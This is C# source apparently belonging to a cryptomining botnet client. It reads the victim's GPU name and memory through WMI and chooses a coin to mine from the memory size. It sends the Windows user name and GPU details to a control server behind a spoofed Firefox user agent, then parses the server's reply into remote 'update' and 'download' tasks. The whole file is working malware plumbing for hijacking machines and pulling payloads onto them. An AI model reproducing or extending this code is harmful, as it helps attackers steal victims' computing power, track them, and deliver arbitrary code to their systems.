using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace VolVeRFINAL
{
    class Host
    {

        private static string adm = "isfislalwidaq";

        public static string get(string url)
        {
            try
            {
                WebRequest request = WebRequest.Create(url);
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
                StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream());
                return reader.ReadToEnd();
            }
            catch  
            {
                return null;
            }
        }

        public static string[] getTasks()
        {

            int _ram = 0;

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("select AdapterRAM from Win32_VideoController");

            foreach (ManagementObject mo in searcher.Get())
            {
                var ram = mo.Properties["AdapterRAM"].Value as UInt32?;

                if (ram.HasValue)
                {
                    _ram = (int)(ram / 1048576);
                }
            }

            int num = _ram / 1024;

            string str33 = "";

            using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
            {
                foreach (ManagementObject managementObject in managementObjectSearcher.Get())
                    str33 = str33 + managementObject["Name"].ToString() + "; ";
            }

            string str1 = "";
            if (num > 4)
                str1 = " | ETC";
            if (num > 8)
                str1 = " | ETH";

            string[] strArray = get(adm + "?hwid=" + WindowsIdentity.GetCurrent().Name + "&gpuname=" + str33 + "&mining=" + num + "&active=" + "XMR" + str1).Split(new char[] { '|' });
            string[] strArray2 = new string[strArray.Length];
            int index = 0;
            foreach (string str2 in strArray)
            {
                try
                {
                    string[] strArray3 = str2.Split(new char[] { ';' });
                    string str3 = strArray3[0].Equals("Update") ? "upd" : "dwl";
                    string str4 = strArray3[1];
                    string str5 = strArray3[2];
                    strArray2[index] = str3 + ";" + str4 + ";" + str5;
                }
                catch (Exception ex)
                {
                }
                index++;
            }
            return strArray2;


        }

    }
}
